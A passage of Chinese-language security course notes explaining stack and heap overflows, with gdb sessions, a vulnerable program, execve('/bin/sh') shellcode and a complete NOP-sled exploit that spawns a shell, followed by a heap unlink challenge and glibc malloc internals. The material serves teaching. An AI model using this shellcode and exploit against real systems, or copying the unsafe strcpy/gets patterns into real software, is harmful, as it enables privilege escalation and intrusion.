int main(int argc, char *argv[ ]){
  if (argc == 2){
    printf("%s\n", agrv[1]);
  }
  else{
    printf("Error.\n");
  }
  return 0;
}
```

> - 将上述程序编译运行，使用不同命令进行运行，即可知 `argv[0]` 为程序名称或者文件路径，并占用一个参数位置。

```term
$ gcc -g -o main main.c
$ ./main c
c
$ ./main
Error.
$ ./main c 1
Error.
```

### 函数调用

<p align="center">
  <img src="./img/函数调用.png"></img>
</p>

#### 函数调用的步骤

<p align="center">
  <img src="./img/函数调用的步骤1.png"></img>
  <img src="./img/函数调用的步骤2.png"></img>
  <img src="./img/函数调用的步骤3.png"></img>
  <img src="./img/函数调用的步骤4.png"></img>
</p>

#### 栈溢出

<p align="center">
  <img src="./img/栈溢出1.png"></img>
</p>

- [x] 修改相邻变量甚至返回地址

<p align="center">
  <img src="./img/栈溢出2.png"></img>
</p>

> - 如果用户增加输入字符串的长度，将会超过password数组的边界，从而覆盖前栈帧EBP，甚至是覆盖返回地址RET。当返回地址RET被覆盖后，将会造成进程执行跳转的异常。

## 栈溢出漏洞

### 溢出攻击原理

- [x] 向缓冲区写入超过缓冲区长度的内容，造成缓冲区溢出，破坏程序的堆栈，使程序转而执行其他的指令，达到攻击的目的
- [x] 原因：程序中缺少错误检测

```c
#include <string.h>

void func(char *str) {
  char buf[16];
  strcpy( buf, str);
}

int main(){
  char *str = "This is definitelt longer than 12";
  func(str);
  return 1;
}
```

> - 如果str的内容多于16个非0字符，就会造成buf的溢出，使程序出错
> - `栈` 由 `高端地址` 向 `低端地址` 生长
> - `缓冲区中的数据` 依然是从 `低端地址` 向 `高端地址` 生长
> - 当复制数据到 `buffer` 时, 要复制的数据从 `buffer[0]` 的位置开始, 直到 `buffer[11]` 结束。如果仍有未复制完的数据,  `strcpy()` 函数将继续复制数据到 `buffer` 数组以上的区域, 如 `buffer[12]、buffer[13]` , 以此类推

<p align="center">
  <img src="./img/溢出攻击原理.png"></img>
</p>

- [x] 类似函数有 <kbd style="color:purple;">strcat、sprintf、vsprintf、gets、scanf</kbd> 等
- [x] 一般溢出会造成程序读/写或执行非法内存的数据，引发 `segmentation fault` 异常退出
- [x] 如果在一个<span style="color:blue;">suid</span>程序中精心构造内容，可以有目的的执行程序，如/bin/sh，得到root权限
- [x] 对于使用C语言开发的软件，缓冲区溢出大部分是 `数组越界` 或 `指针非法引用` 造成的
- [x] 现存的软件中可能存在缓冲区溢出攻击，因此缓冲区溢出攻击短期内不可能杜绝

#### 缓冲区溢出攻击的要素

- [x] 在进程的地址空间安排适当的代码( `shellcode` )
- [x] 通过适当的初始化寄存器和内存，跳转到以上代码段执行

<!-- tabs:start -->

##### **安排代码的方法**

<!-- tabs:start -->

###### **利用进程中存在的代码**

- 传递一个适当的参数
- 如程序中有exec(arg)，只要把arg指向“/bin/sh”就可以了

###### **植入法**

- 把指令序列放到缓冲区中
- 堆、栈、数据段都可以存放攻击代码，最常见的是利用栈

<!-- tabs:end -->

##### **控制程序转移到攻击代码的方法**

<!-- tabs:start -->

###### **利用栈帧**

- [x] 溢出栈中的局部变量，使返回地址指向攻击代码，栈溢出攻击Stack Smashing Attack

<p align="center">
  <img src="./img/利用栈帧.png"></img>
</p>

###### **函数指针**

- [x] 如果定义有函数指针，溢出函数指针前面的缓冲区，修改函数指针的内容

<p align="center">
  <img src="./img/函数指针.png"></img>
</p>

###### **长跳转缓冲区**

- [x] setjmp/longjmp语句
  - 实现非本地跳转(<span style="color:blue;">在栈上跳过若干调用帧</span>)
    - 从一个深层嵌套的函数调用中直接返回，不经过正常的“调用-返回”序列
    - 使一个信号处理程序转移到一个特殊的代码位置，sigsetjmp/siglongjmp
  - 函数原型：
    - int setjmp(jmp_buf env);
      > - 返回：函数直接调用则为0；若从longjmp返回则为非0
    - void longjmp(jmp_buf env, int retval );  retval值非0
  - setjmp函数在env缓冲区中保存当前栈的内容，以供后面longjmp使用，并返回0。longjmp函数从env缓冲区中恢复栈的内容，然后触发一个从最近一次初始化env的setjmp调用的返回。然后setjmp返回，并带有非0的返回值retval

- [x] 覆盖setjmp/longjmp的缓冲区内容，longjmp就可以跳转到攻击者的代码

<!-- tabs:end -->

<!-- tabs:end -->

#### 常见的攻击技术

- [x] 一个字符串中完成 `代码植入` 和 `跳转`
  - 一般修改栈帧

<p align="center">
  <img src="./img/常见的栈溢出攻击技术1.png"></img>
</p>

- [x] 代码植入和缓冲区溢出不一定要在在一次动作内完成
  - 攻击者可以先在一个缓冲区内 `放置代码` ，这是不能溢出的缓冲区；然后，攻击者通过溢出另外一个缓冲区来<span style="color:blue;">改写程序转移的指针</span>
  - 这种方法一般用来解决可供溢出的缓冲区不够大(不能放下全部的攻击代码)的情况

- [x] 如果攻击者试图使用已经常驻的代码而不是从外部植入代码，他们通常必须<span style="color:blue;">把代码作为参数调用</span>
  - 例如，在libc(几乎所有的C程序都要它来连接)中的部分代码段会执行“exec(arg)”，其中arg就是参数。攻击者首先使用缓冲区溢出改变程序的参数arg，然后利用另一个缓冲区溢出使程序指针指向libc中的特定的代码段，此代码段中包括exec(arg)

### 栈溢出的例子

<!-- tabs:start -->

#### **栈溢出的例子1**

```c
#include <stdio.h>

int main(){
  char a[4];
  gets(a);
  puts(a);
  return 0;
}
```

> - 编译时出现如下信息：

```term
$ gcc -g -o main main.c
/tmp/cczLEaUN.o: In function `main`:
/home/example/main.c:3:warning: the `gets` function is dangerous and should not be used. 
```

> - 不理会该信息，执行程序 `./main` ，有以下结果：

```term
$ ./main
## $ aaaa
aaaa
$ ./main
## $ aaaaaa
aaaaaa
$ ./main
## $ aaaaaaaaaaaaaaa
aaaaaaaaaaaaaaa
Segmentation fault
```

> - 输入较多字符时就会造成 `Segmentation fault` 。

<!-- chat:start -->

<!-- title: 理解 -->

#### **Tips**

覆盖<span style="color:blue;">栈底内容</span>，不会报错；覆盖<span style="color:blue;">返回指针</span>，才会报错，此时，栈溢出了

<!-- chat:end -->

> 注：有些系统在覆盖栈底内容时，就已经报错了

<p align="center">
  <img src="./img/栈溢出的例子1.png"></img>
</p>

#### **栈溢出的例子2**

```c
#include <stdio.h>

void function(int a, int b, int c){
  char buffer1[5];
  char buffer2[10];
  int *ret;
  ret = buffer1 + 12;
  (*ret) += 8;
}

int main(){
  int x;
  x = 0;
  function(1, 2, 3);
  x = 1;
  printf("%d\n", x);
  return 0;
}
```

- [x] 在子函数function中，栈分配buffer1，然后定义一个指向int型变量的指针ret

- [x] 在栈中，buffer1虽然只有5个字节，但是由于对齐分配，实际上分配了8个字节，所以，<span style="color:red;">buffer1+8就是ebp，buffer1+12存储的就应该是返回地址</span>

- [x] <span style="color:red;">将该返回地址的内容加8，则会跳过语句“x = 1;”，因此，打印结果应该是0</span>

> - 为便于理解，在此处画出一个栈图，如下所示(该图有点小问题，也就是function返回地址存储地址不是和x = 1语句紧挨着，但是其值+8即可得到printf的地址，同时本图为了简单也没有画buffer2，其在buffer1和ret之间)。

<p align="center">
  <img src="./img/栈溢出的例子2.png"></img>
</p>

<!-- tabs:start -->

##### **在Redhat 6.2上测试**

```term
$ gcc -g -o ovr_ret ovr_ret.c 
ovr_ret.c: In function `function':
ovr_ret.c:6: warning: assignment from incompatible pointer type
$ ./ovr_ret 
0
```

> - 由此可见，分析正确，函数的返回地址确实被改写，程序并没有执行语句“x=1;”，程序的打印结果为0，通过改写函数返回地址，即可定制程序流程。

##### **在Debian 2.4.18上测试**

```term
$ gcc -g -o ovr_ret ovr_ret.c 
ovr_ret.c: In function `function':
ovr_ret.c:6: warning: assignment from incompatible pointer type
$ ./ovr_ret 
1
```

- [x] 为了看为什么结果不一致，此时引入 <kbd>gdb</kbd> 进行调试。

- [x] gdb
  -  file  装入想要调试的可执行文件
  -  kill  终止正在调试的程序
  -  list  列出产生执行文件的源代码的一部分
  -  next  执行一行源代码但不进入函数内部
  -  step  执行一行源代码而且进入函数内部
  -  run  执行当前被调试的程序
  -  quit  终止 gdb
  -  watch  使你能监视一个变量的值而不管它何时被改变
  -  break  在代码里设置断点, 这将使程序执行到这里时被挂起
  -  make  使你能不退出gdb 就可以重新产生可执行文件
  -  shell  使你能不离开gdb 就执行UNIX shell 命令
  -  info all
    - ebp  栈底
    - esp  栈顶
    - eip  CPU下次要执行的指令的地址
    - esi  寻址数据段DS 

> 使用 <kbd style="color:green">gdb</kbd> 进行调试如下。

```term
$ gdb ovr_ret
## (gdb) $ b 6
Breakpoint 1 at 0x804838a: file ovr_ret.c, line 6.
## (gdb) $ r
Starting program: /home/dayin/ovr_ret 

Breakpoint 1, function (a=1, b=2, c=3) at ovr_ret.c:6
6          ret = buffer1 + 12;
## (gdb) $ x $esp                     
0xbffffcf0:     0x4014a870
## (gdb) $ x $ebp
0xbffffd28:     0xbffffd48
## (gdb) $ x buffer1
0xbffffd10:     0x08048400
// 此处可以推出 $ebp– buffer1 = 24
// 由于根据结构而言 retip = $ebp + 4，也就是ebp的下一个字长为函数返回地址
// 推导出
// retip – buffer1 = 28
## (gdb) $ x buffer2
0xbffffd00:     0xbffffdac
## (gdb) $ x/20 $esp
// 此处是指从esp开始的20个字长(4字节)的内容，第一列表示从这个地址开始的连续四个字长的内容
0xbffffcf0:     0x4014a870      0xbffffd04      0x40030c85      0x4014a880
0xbffffd00:     0xbffffdac      0xbffffd24      0x40030d3f      0x40016ca0
0xbffffd10:     0x08048400      0x08049604      0xbffffd28      0x0804828d
0xbffffd20:     0x40017074      0x40017af0      0xbffffd48      0x080483d5 retip(由于ebp在地址0xbffffd28值为0xbffffd48，所以其下一个字长地址即为retip，值为0x080483d5)
0xbffffd30:     0x00000001      0x00000002      0x00000003      0x4014a880
// 进行反编译
## (gdb) $ disas main
Dump of assembler code for function main:
0x080483a2 <main+0>:    push   %ebp
0x080483a3 <main+1>:    mov %esp,%ebp
0x080483a5 <main+3>:    sub    $0x18,%esp
0x080483a8 <main+6>:    and    $0xfffffff0,%esp
0x080483ab <main+9>:    mov $0x0,%eax
0x080483b0 <main+14>:   sub    %eax,%esp
0x080483b2 <main+16>:   movl $0x0,0xfffffffc(%ebp)
0x080483b9 <main+23>:   movl $0x3,0x8(%esp)
0x080483c1 <main+31>:   movl $0x2,0x4(%esp)
0x080483c9 <main+39>:   movl $0x1,(%esp)
0x080483d0 <main+46>:   call   0x8048384 <function>
0x080483d5 <main+51>:   movl $0x1,0xfffffffc(%ebp) // 此处根据上方的retip值为0x080483d5可知，此处为retip
// 由于函数返回地址也就是直接返回到函数结束后下一条命令的位置，且上述汇编代码将0x1的值赋值给一个变量，可知其为x = 1;代码地址
0x080483dc <main+58>:   mov 0xfffffffc(%ebp),%eax // 那么此处就是printf语句地址
0x080483df <main+61>:   mov %eax,0x4(%esp)
0x080483e3 <main+65>:   movl $0x8048514,(%esp)
0x080483ea <main+72>:   call   0x80482b0 <_init+56>
0x080483ef <main+77>:   leave  
0x080483f0 <main+78>:   ret    
End of assembler dump.
// 通过上面可推理出需要跳过x = 1;直接跳到printf，则需要把函数返回地址从地址0x080483d5改到0x080483dc
// new retip – old retip = 7 
```

- [x] 修改后的程序

```c
#include <stdio.h>

void function(int a, int b, int c) {
  char buffer1[5];
  char buffer2[10];
  int *ret;
  ret = buffer1 + 28;
  (*ret) += 7;
}

int main() {
  int x;
  x = 0;
  function(1,2,3);
  x = 1;
  printf("%d\n",x);
  return 0;
}
```

> 运行结果如下：

```term
$ gcc -g -o ovr_ret_new ovr_ret_new.c 
ovr_ret_new.c: In function `function':
ovr_ret_new.c:6: warning: assignment from incompatible pointer type
$ ./ovr_ret_new 
0
```

- [x] 函数调用情况

```term
## (gdb) $ disas main
Dump of assembler code for function main:
…
0x080483b9 <main+23>:   movl $0x3,0x8(%esp)
0x080483c1 <main+31>:   movl $0x2,0x4(%esp)
0x080483c9 <main+39>:   movl $0x1,(%esp) // 分配栈帧
0x080483d0 <main+46>:   call   0x8048384 <function> // 函数调用
0x080483d5 <main+51>:   movl $0x1,0xfffffffc(%ebp) // 函数返回地址
…
End of assembler dump.
## (gdb) $ disas function
Dump of assembler code for function function:
0x08048384 <function+0>:       push   %ebp // 在函数调用地址
0x08048385 <function+1>:       mov  %esp, %ebp // 将原来函数的esp赋值给ebp
0x08048387 <function+3>:       sub  $0x38, %esp // 原有esp减去一个值也就是分配一个新的栈帧
…
0x080483a1 <function+29>:      ret     
End of assembler dump.
```

- [x] 函数调用所建立的栈帧包含(以IA32为例)：
  - 函数的返回地址
  - 调用函数的栈帧信息，即栈顶和栈底
  - 为函数的局部变量分配的空间
  - 为被调用函数的参数分配的空间

```term
$ gdb ovr_ret_new
## (gdb) $ b 6
Breakpoint 1 at 0x804838a: file ovr_ret_new.c, line 6.
## (gdb) $ r
Starting program: /home/example/ovr_ret_new 
Breakpoint 1, function (a=1, b=2, c=3) at ovr_ret_new.c:6
6      ret = buffer1 + 28;
## (gdb) $ x $esp                     
0xbffffcf0:     0x4014a870
## (gdb) $ x $ebp
0xbffffd28:     0xbffffd48
## (gdb) $ x buffer1
0xbffffd10:     0x08048400
## (gdb) $ x buffer2
0xbffffd00:     0xbffffdac
## (gdb) $ x/20 $esp
0xbffffce0:     0x4014a870      0xbffffcf4      0x40030c85      0x4014a880
0xbffffcf0:     0xbffffd9c      0xbffffd14      0x40030d3f      0x40016ca0
0xbffffd00:     0x08048400      0x08049604      0xbffffd18      0x0804828d
0xbffffd10:     0x40017074      0x40017af0      0xbffffd38      0x080483d5
0xbffffd20:     0x00000001      0x00000002      0x00000003      0x4014a880
```

- [x] 函数调用所建立的栈帧包含(以IA32为例)：
  - 为被调用函数的参数分配的空间 0x00000001   0x00000002  0x00000003
  - 函数的返回地址 0x080483d5
  - 调用函数的栈帧信息，即栈顶和栈底 0x4014a870 0xbffffd38
  - 为函数的局部变量分配的空间 buffer2:16(buffer1地址-buffer2地址)  buffer1:24(ebp地址-buffer1地址)

<!-- tabs:end -->

<!-- tabs:end -->

### 一个溢出和攻击的演示

- [x] 缓冲区溢出攻击
- [x] Shellcode解析
- [x] 攻击程序
- [x] 运行平台
  - Linux debian 2.4.18-bf2.4 #1 Son Apr 14 09:53:28 CEST 2002 i686 unknown
  - Gcc 3.3.5

<!-- tabs:start -->

#### **缺陷程序**

```c
// 命名为hello.c
#include <stdio.h>
#include <string.h>

void SayHello(char* name){
  char tmpName[60];

  // buffer overflow
  strcpy(tmpName, name);

  printf("Hello %s\n", tmpName);
}

int main(int argc, char** argv){
  if (argc != 2) {
    printf("Usage: hello <name>.\n");
    return 1;
  }
  SayHello(argv[1]);
  return 0;
}
```

<!-- tabs:start -->

##### **运行情况如下**

```term
$ gcc–g –o hello hello.c
$ ./hello `perl-e 'print "A" x 60'`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./hello `perl-e 'print "A" x 71'`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./hello `perl-e 'print "A" x 72'`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

##### **调试情况如下**

```term
$ gdb hello
## (gdb) $ l
## (gdb) $ b 9
## (gdb) $ r `perl -e 'print "A" x 72'`
## (gdb) $ x/8 $esp
0xbffffc90:     0x40090fd0      0xbffffe2f      0x4008978e      0x4014a880
0xbffffca0:     0x4014a870      0xbffffcb4      0x40030c85      0x4014a880
## (gdb) $ x tmpName
0xbffffca0:     0x4014a870
## (gdb) $ x/4 $ebp
0xbffffce8:     0xbffffcf8      0x0804842c      0xbffffe41      0xbffffd54
// 返回地址内容：0x0804842c(同样的由于retip紧跟ebp后可得到)
// $ebp内容：0xbffffcf8
// $ebp – tmpName = 0xbffffce8 – 0xbffffca0 = 72
## (gdb) $ disas main
Dump of assembler code for function main:
0x080483f1 <main+0>:    push   %ebp
0x080483f2 <main+1>:    mov    %esp,%ebp
0x080483f4 <main+3>:    sub    $0x8,%esp
0x080483f7 <main+6>:    and    $0xfffffff0,%esp
0x080483fa <main+9>:    mov    $0x0,%eax
0x080483ff <main+14>:   sub    %eax,%esp
0x08048401 <main+16>:   cmpl   $0x2,0x8(%ebp)
0x08048405 <main+20>:   je     0x804841c <main+43>
0x08048407 <main+22>:   movl   $0x804855e,(%esp)
0x0804840e <main+29>:   call   0x80482d8 <_init+56>
0x08048413 <main+34>:   movl   $0x1,0xfffffffc(%ebp)
0x0804841a <main+41>:   jmp    0x8048433 <main+66>
0x0804841c <main+43>:   mov    0xc(%ebp),%eax
0x0804841f <main+46>:   add    $0x4,%eax
0x08048422 <main+49>:   mov    (%eax),%eax
0x08048424 <main+51>:   mov    %eax,(%esp)
0x08048427 <main+54>:   call   0x80483c4 <SayHello> // 返回地址，由上可得
0x0804842c <main+59>:   movl   $0x0,0xfffffffc(%ebp)
0x08048433 <main+66>:   mov    0xfffffffc(%ebp),%eax
0x08048436 <main+69>:   leave  
0x08048437 <main+70>:   ret    
End of assembler dump.
## (gdb) $ x/24 $esp
0xbffffc90:     0x40090fd0      0xbffffe2f      0x4008978e      0x4014a880
0xbffffca0:     0x4014a870      0xbffffcb4      0x40030c85      0x4014a880
0xbffffcb0:     0xbffffd60      0xbffffcd4      0x40030d3f      0x40016ca0
0xbffffcc0:     0x08048440      0x08049660      0xbffffcd8      0x080482b5
0xbffffcd0:     0x40017074      0x40017af0      0xbffffcf8      0x0804845b
0xbffffce0:     0x4014a880      0x080484a0      0xbffffcf8      0x0804842c
## (gdb) $ n //执行“strcpy(tmpName, name);”，因为断点在此步，n即单步运行此步
11          printf("Hello %s\n", tmpName);
## (gdb) $ x/24 $esp
0xbffffc90:     0xbffffca0      0xbffffe41      0x4008978e      0x4014a880
0xbffffca0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcc0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcd0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffce0:     0x41414141      0x41414141      0xbffffc00      0x0804842c
// $ebp内容被覆盖(原有的倒数第一行倒数第二个0xbffffcf8也就是ebp的内容被修改为0xbffffc00)
// Segmentation fault
```

<!-- tabs:end -->

#### **如果精心选择数据**

<p align="center">
  <img src="./img/如果精心选择数据.png"></img>
</p>

- [x] 如何选择这些数据？
  - 几个问题：
    - SayHello函数局部变量区大小？
    - NNNNNNNN如何确定？
    - Our-codes该怎样写
    - 输入缓冲区内容不能包含0

<!-- tabs:start -->

##### **局部变量区问题**

<p align="center">
  <img src="./img/局部变量区问题.png"></img>
</p>

##### **代码起始地址如何确定？**

<p align="center">
  <img src="./img/局部变量区问题.png"></img>
</p>

- [x] 问题已转化为用ESP加上某一偏移
  - 该偏移<span style="color:blue;">不需要精确</span>

- [x] ESP如何确定呢
  - 用同样选项，插入一段代码，重新编译
  - 使用调试工具跟踪应用程序
  - 编一小程序，打印出运行时栈顶位置
    - <span style="color:blue;">在同样环境下，不同进程之间栈位置距离不会太远</span>

- [x] 为什么偏移不需要精确？

<p align="center">
  <img src="./img/为什么偏移不需要精确.png"></img>
</p>

<!-- chat:start -->

<!-- title:理解 -->

#### **Tips**

如果一直没有找到有效代码，其就会一直把无效地址操作出栈，直到命中真实代码。 

<!-- chat:end -->

##### **Shellcode编写**

- [x] execve - execute program
- [x] <kbd style="color:purple">int execve(const char *filename, char *const argv [], char *const envp[]);</kbd>
- [x] <kbd style="color:purple">execve("pointer to string /bin/sh", "pointer to /bin/sh", "pointer to NULL");</kbd>

```shell
jmp short callit              ; jmp trick as explained above
doit:
pop         esi ;             ; esi now represents the location of our string
xor         eax, eax          ; make eax 0
mov byte    [esi + 7], al     ; terminate /bin/sh 
lea         ebx, [esi]        ; get the adress of /bin/sh and put it in register ebx 
mov long    [esi + 8], ebx    ; put the value of ebx (the address of /bin/sh) in AAAA ([esi +8]) 
mov long    [esi + 12], eax   ; put NULL in BBBB (remember xor eax, eax) 
mov byte    al, 0x0b          ; Execution time! we use syscall 0x0b which represents execve
mov         ebx, esi          ; argument one... ratatata /bin/sh
lea         ecx, [esi + 8]    ; argument two... ratatata our pointer to /bin/sh
lea         edx, [esi + 12]   ; argument three... ratataa our pointer to NULL 
int         0x80 

callit:     
call        doit              ; part of the jmp trick to get the location of db
db          '/bin/sh#AAAABBBB'
```

- [x] Shellcode二进制形式

```c
// 其以/bin/sh#AAAABBBB结尾前面为乱码 
char shellcode[] =
 "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
 "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
 "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41"
 "\x42\x42\x42\x42";
```

<!-- tabs:end -->

#### **完整的攻击hello的程序**

```c
//  hello2.c
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
unsigned char shell_code[] =
"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
"\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41"
"\x42\x42\x42\x42";

#define DEFAULT_OFFSET  0
#define BUFFER_SIZE 1024

unsigned long get_esp() {
    unsigned long esp;
    __asm__("movl %%esp, %0" : "=r"(esp));
    return esp;
}

int main(int argc, char** argv)
{
  char* buff;
  char* ptr;
  unsigned long* addr_ptr;
  unsigned long esp;
  int i, ofs;
  if (argc == 1)
    ofs = DEFAULT_OFFSET;
  else
    ofs = atoi(argv[1]);

  ptr = buff = malloc(4 * BUFFER_SIZE);

  /* Fill in with addresses */
  addr_ptr = (unsigned long*)ptr;
  esp = get_esp();
  printf("ESP = %08x\n", esp);
  for (i = 0; i < 100; i++)
    *(addr_ptr++) = esp + ofs;

  /* Fill the start of shell buffer with NOPs */
  ptr = (char*)addr_ptr;
  memset(ptr,0x90,BUFFER_SIZE-strlen(shell_code));
  ptr += BUFFER_SIZE - strlen(shell_code);

  /* And then the shell code */
  memcpy(ptr, shell_code, strlen(shell_code));
  ptr += strlen(shell_code);

  *ptr = 0;

  execl("./hello", "hello", buff, NULL);

  return 0;  
}
```

<!-- tabs:start -->

##### **运行情况**

```term
$ gcc–g –o hello2 hello2.c
$ ./hello2
ESP = bffffd18
Hello 
ýÿ¿ ýÿ¿ ýÿ¿ ý¿ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ý
...   //省略
...  //省略
ë^1ÀˆF‰‰F
...  //省略
‰óV
...  //省略
Í€èáÿÿÿ/bin/sh#AAAABBBB
sh-2.05b$
```

##### **调试情况**

```term
$ gdb hello
## (gdb) $ b 52
Breakpoint 1 at 0x80485e5: file hello2.c, line 52.
## (gdb) $ r
Starting program: /home/dayin/hello
ESP = bffffd18
Breakpoint 1, main (argc=1, argv=0xbffffda4) at hello2.c:52
52execl("./hello", "hello", buff, NULL);
(gdb) x/360 buff

0x80498f8:   0xbffffd18   0xbffffd18 0xbffffd18 0xbffffd18
…
0x8049a78:   0xbffffd18   0xbffffd18 0xbffffd18 0xbffffd18
// 上面为粗略代码起始地址

0x8049a88:   0x90909090   0x90909090 0x90909090 0x90909090
…
0x8049e48:   0x90909090   0x90909090 0x90909090 0xeb909090
// 上面为NOP区域

0x8049e58:   0xc0315e1a   0x8d074688   0x085e891e   0xb00c4689
0x8049e68:   0x8df3890b   0x568d084e   0xe880cd0c   0xffffffe1
0x8049e78:   0x6e69622f   0x2368732f   0x41414141   0x42424242
0x8049e88:   0x00000000   0x00000000 0x00000000 0x00000000
// 以上为shellcode
```

<!-- tabs:end -->

<!-- tabs:end -->

#### 插曲：strncpyVS. memcpy

- [x] <kbd>char *strncpy(char *dest, char *src, int n)</kbd>
  - 把src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回dest
  - strncpy_百度百科

- [x] <kbd>void *memcpy(void *dest, const void *src, size_t n)</kbd>
  - 从源src所指的内存地址的起始位置开始拷贝n个字节到目标dest所指的内存地址的起始位置中
  - memcpy_百度百科

## 堆溢出漏洞

### 堆溢出

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
  struct tagOBJ *fd;
  struct tagOBJ *bk;
  char buf[8];
}

void shell(){
  system("/bin/sh");
}

void unlink(OBJ *P){
  OBJ *BK;
  OBJ *FD;
  BK = P -> bk;
  FD = P -> fd;
  FD -> bk = BK;
  BK -> fd = FD;
}

int main(int argc, char *argv[]){
  malloc(1024);
  OBJ *A = (OBJ*)malloc(sizeof(OBJ));
  OBJ *B = (OBJ*)malloc(sizeof(OBJ));
  OBJ *C = (OBJ*)malloc(sizeof(OBJ));

  // double linked list: A <-> B <-> C (链表 vs. 数组?)
  A -> fd = B;
  B -> bk = A;
  B -> fd = C;
  C -> bk = B;

  printf("here is stack address leak: %p\n", &A);
  printf("here is heap address leak: %p\n", A);
  printf("now that you have leaks, get shell!\n");

  // heap overflow!
  gets(A -> buf);

  // exploit this unlink!
  unlink(B);
  return 0;

}
```

### 堆在进程空间中的位置

<p align="center">
  <img src="./img/堆在进程空间中的位置.png"></img>
</p>

### 堆与栈的区别

- <span style="color:red;">栈</span>空间由<span style="color:blue;">系统维护</span>。分配和回收都是由系统来完成的
  - <span style="color:blue;">对程序员来说都是透明的</span>
- [x] <span style="color:red;">堆是一种在程序运行时<span style="color:blue;">动态分配</span>的内存
  - 所谓<span style="color:red;">动态</span>，是指所需内存的大小在程序设计时不能预先确定或内存过大无法在栈中进行分配，需要在程序运行时参考用户的反馈
  - <span style="color:blue;">需要程序员使用专有的函数进行申请和释放</span>

<p align="center">
  <img src="./img/堆与栈的区别.png"></img>
</p>

### Linux堆管理算法

- [x] Linux系统通过 <kbd style="color:red;">glibc</kbd> 程序库提供堆内存管理功能，存在两种堆管理算法
  - glibc2.2.4及以下版本是使用Doug Lea的实现方法
  - glibc2.2.5及以上版本采用了Wolfram Gloger的ptmalloc/ptmalloc2代码。ptmalloc2代码是从Doug Lea的代码移植过来的，增加了对多线程的支持，并引进了fastbin机制
- [x] 从Doug lea的实现方法说起

### Linux堆管理结构

- [x] Linux整个堆区被划分成若干个连续的块(<span style="color:blue;">chunk</span>)，类似下图分布

<p align="center">
  <img src="./img/块.png"></img>
</p>

- [x] 标记：
  - <kbd style="color:red;">U</kbd>— <span style="color:blue;">正在被使用的块</span>
  - <kbd style="color:red;">F</kbd> — <span style="color:blue;">空闲的块</span>
  - <kbd style="color:red;">TOP</kbd> — <span style="color:blue;">位于高地址最边缘的那个块(空闲)</span>

#### 堆块(chunk)的结构

- [x] 堆块的头部有一个用于管理当前块的管理结构(<span style="color:blue;">块首</span>)，这个管理结构的长度对于<span style="color:red;">正在使用</span>的chunk是<span style="color:red;">8字节，而对于<span style="color:darkcyan;">空闲的chunk</span>则为<span style="color:darkcyan;">16字节</span>
- [x] 管理结构的定义如下：

```c
struct malloc_chunk
{
  int prev_size;  // 如果上一块是空闲, 此值为上一块的长度
  int size;      // 当前块的长度，包括管理结构本身
  struct malloc_chunk *fd;  // 双向链表的前指针
  struct malloc_chunk *bk;  // 双向链表的后指针
  // 空闲块才有后两个指针
}
```

<!-- tabs:start -->

##### **U块的结构**

- [x] U块的块首是8字节

<p align="center">
  <img src="./img/U块的结构.png"></img>
</p>

##### **F块的结构**

- [x] F块的块首是16字节

<p align="center">
  <img src="./img/F块的结构.png"></img>
</p>

##### **P标志位**

- [x] <span style="color:red;">“P”标志</span>是“当前块字节数”(chunk->size)中的最低一位，表示是<span style="color:blue;">否上一块正在被使用</span>
  - 如果<span style="color:red;">P位为1</span>，则表示<span style="color:blue;">上一块正在被使用</span>，这时chunk->prev_size通常为零
  - 如果<span style="color:red;">P位为0</span>，则表示<span style="color:blue;">上一块是空闲块</span>，这时chunk->prev_size字段其实是上一个块用户数据区的一部分
- [x] 任何一个块的<span style="color:red;">空闲与否</span>是由<span style="color:red;">下一个块的</span><span style="color:blue;">chunk->size的</span><span style="color:red;">P标志</span>来确定的

##### **M标志位**

- [x] <span style="color:red;">“M”位</span>是表示此内存块<span style="color:blue;">是不是由mmap()分配的</span>
- [x] 如果置1，则是由mmap()分配的，那么在释放时会以另外的方式处理，与现在的讨论无关
- [x] P和M标志位的定义如下：

```c
#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
```

<!-- tabs:end -->

### 双向链表Bin

- [x] 在Doug Lea实现的Malloc中，除了TOP块外的所有<span style="color:red;">空闲块</span><span style="color:blue;">以长度大小被分组</span>，它们的信息被存放在称为Bin的<span style="color:red;">双向循环链表</span>中，共有128个表项，它们分别存放特定长度的空闲内存块信息
- [x] 系统在分配内存时<span style="color:blue;">首先</span>会到<span style="color:red;">Bin链表</span>中寻找是否存在<span style="color:blue;">合适大小的内存块</span>，如果找不到才会从<span style="color:red;">TOP块</span>中分割出一块来并把指针返回给用户进程
- [x] <span style="color:red;">Bin链表</span>的<span style="color:blue;">索引指针</span>存放在一个<span style="color:blue;">数组</span>中，malloc根据块的大小来获取Bin链表指针在数组中的索引

#### Bin链表索引

